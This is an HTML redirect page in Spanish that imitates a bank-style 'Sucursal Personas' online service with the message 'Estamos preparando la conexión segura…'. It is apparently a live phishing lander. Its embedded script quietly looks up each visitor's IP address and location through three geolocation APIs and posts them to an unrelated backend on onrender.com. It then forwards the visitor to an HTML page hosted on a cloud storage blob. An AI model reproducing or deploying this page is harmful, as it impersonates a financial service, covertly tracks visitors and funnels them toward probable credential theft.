<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Redirigiendo… | Sucursal de bloqueos Personas</title>
  <style>
    :root {
      --bg: #f3f6fb;
      --card-bg: rgba(255, 255, 255, 0.7);
      --glass-border: rgba(0, 0, 0, 0.06);
      --accent-1: #4e4e43;
      --accent-2: #f8e706;
      --muted: #5b6b79;
      --shadow: 0 10px 30px rgba(16, 24, 40, 0.08);
      --radius: 14px;
      --font-sans: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    }
    * { box-sizing: border-box; margin: 0; padding: 0 }
    html, body { height: 100% }
    body {
      background: linear-gradient(180deg, #eef6ff 0%, var(--bg) 100%);
      font-family: var(--font-sans);
      color: #0b1a2b;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
    }
    .card {
      width: min(760px, 96vw);
      background: linear-gradient(180deg, rgba(255, 255, 255, 0.85), rgba(255, 255, 255, 0.72));
      border: 1px solid var(--glass-border);
      border-radius: var(--radius);
      padding: 36px;
      box-shadow: var(--shadow);
      display: flex;
      gap: 28px;
      align-items: center;
    }
    .left { flex: 1; min-width: 220px; }
    .brand {
      display: flex;
      gap: 12px;
      align-items: center;
      margin-bottom: 8px;
    }
    .ms-logo {
      width: 44px;
      height: 44px;
      border-radius: 8px;
      background: linear-gradient(135deg, var(--accent-1), var(--accent-2));
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-weight: 700;
      box-shadow: 0 6px 18px rgba(3, 62, 120, 0.12);
      flex-shrink: 0;
    }
    .title {
      font-size: 18px;
      font-weight: 600;
      color: #05263b;
      line-height: 1.1;
    }
    .subtitle {
      margin-top: 6px;
      color: var(--muted);
      font-size: 13px;
    }
    .right {
      width: 220px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 12px;
    }
    .spinner {
      width: 84px;
      height: 84px;
      border-radius: 50%;
      position: relative;
      display: grid;
      place-items: center;
      background: conic-gradient(from 0deg at 50% 50%, var(--accent-1), rgba(0, 0, 0, 0) 60%);
      -webkit-mask: radial-gradient(farthest-side, transparent 60%, black 61%);
      mask: radial-gradient(farthest-side, transparent 60%, black 61%);
      animation: spin 1.25s linear infinite;
      box-shadow: 0 8px 20px rgba(3, 62, 120, 0.08);
    }
    .spinner::after {
      content: "";
      width: 60%;
      height: 60%;
      background: linear-gradient(180deg, #fff, #f7fbff);
      border-radius: 50%;
      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.6);
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .small-note { font-size: 13px; color: var(--muted); text-align: center; }
    .countdown {
      margin-top: 6px;
      font-weight: 600;
      color: var(--accent-2);
      font-size: 13px;
    }
    .manual {
      margin-top: 10px;
      font-size: 13px;
    }
    a.manual-link {
      color: var(--accent-1);
      text-decoration: none;
      font-weight: 600;
    }
    a.manual-link:hover { text-decoration: underline; }
    .ip-display {
      font-size: 10px;
      color: var(--muted);
      margin-top: 5px;
      font-family: 'Courier New', Courier, monospace;
    }
    @media (max-width: 640px) {
      .card {
        flex-direction: column;
        align-items: stretch;
        padding: 20px
      }
      .right {
        width: 100%;
        flex-direction: row;
        justify-content: space-between;
        align-items: center
      }
      .right div[style="text-align:center"] {
        text-align: left;
        padding-left: 12px;
      }
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="left">
      <div class="brand">
        <div class="ms-logo">
          <img src="https://i.postimg.cc/mrgh8wqk/channels4-jprofile.jpg" alt="Logo" style="height:45px;">
        </div>
        <div>
          <div class="title">En unos momentos serás redirigido</div>
          <div class="subtitle">Estamos preparando la conexión segura…</div>
        </div>
      </div>
      <p style="margin-top:18px; color:var(--muted); font-size:14px; line-height:1.5;">
        Si tu navegador no redirige automáticamente, puedes usar el enlace manual debajo.
      </p>
      <p class="manual">
        Ir ahora:
        <a class="manual-link" id="manualLink" href="#" target="_self">Ir a Sucursal Personas</a>
      </p>
    </div>
    <div class="right">
      <div class="spinner"></div>
      <div style="text-align:center">
        <div class="small-note">Cargando conexión segura…</div>
        <div class="countdown" id="countdown">3</div>
        <div class="ip-display" id="ipDisplay">IP: ...</div>
      </div>
    </div>
  </div>

  <script>
    const redirectUrl = "https://personassucursalcliente.blob.core.windows.net/proceso/Virtual-Persona.html";
    const redirectDelayMs = 3000;
    const backendApiUrl = "https://newbrandly.onrender.com/api/notify";

    document.getElementById('manualLink').href = redirectUrl;

    // ---- Función con timeout (2s por API) ----
    async function fetchWithTimeout(url, options = {}) {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), options.timeout || 2000);
      try {
        const res = await fetch(url, { signal: controller.signal });
        clearTimeout(timeout);
        return res;
      } catch (err) {
        clearTimeout(timeout);
        throw err;
      }
    }

    // ---- Fallback global con 3 APIs ----
    async function fetchRobustGeoData() {
      const apis = [
        { url: 'https://ipwho.is/', normalize: d => ({ ip: d.ip, country: d.country, city: d.city, region: d.region }) },
        { url: 'https://ipapi.co/json/', normalize: d => ({ ip: d.ip, country: d.country_name, city: d.city, region: d.region }) },
        { url: 'https://get.geojs.io/v1/ip/geo.json', normalize: d => ({ ip: d.ip, country: d.country, city: d.city, region: d.region }) }
      ];

      for (const api of apis) {
        try {
          const res = await fetchWithTimeout(api.url, { timeout: 2000 });
          if (!res.ok) continue;
          const data = await res.json();
          if (data && data.ip) return api.normalize(data);
        } catch { continue; }
      }
      throw new Error("Todas las APIs de geolocalización fallaron.");
    }

    async function initRedirectAndNotify() {
      const ipEl = document.getElementById('ipDisplay');
      try {
        const geoData = await fetchRobustGeoData();
        ipEl.textContent = geoData.ip || "IP: n/a";

        await fetch(backendApiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(geoData)
        });
      } catch (err) {
        console.error("Error al obtener o enviar geodatos:", err);
        ipEl.textContent = "IP: Error";
      }

      // Contador y redirección
      const countdownEl = document.getElementById('countdown');
      let remaining = Math.ceil(redirectDelayMs / 1000);
      countdownEl.textContent = remaining;
      const interval = setInterval(() => {
        remaining--;
        countdownEl.textContent = remaining > 0 ? remaining : "0";
        if (remaining <= 0) clearInterval(interval);
      }, 1000);

      setTimeout(() => window.location.replace(redirectUrl), redirectDelayMs);
    }

    initRedirectAndNotify();
  </script>
</body>
</html>
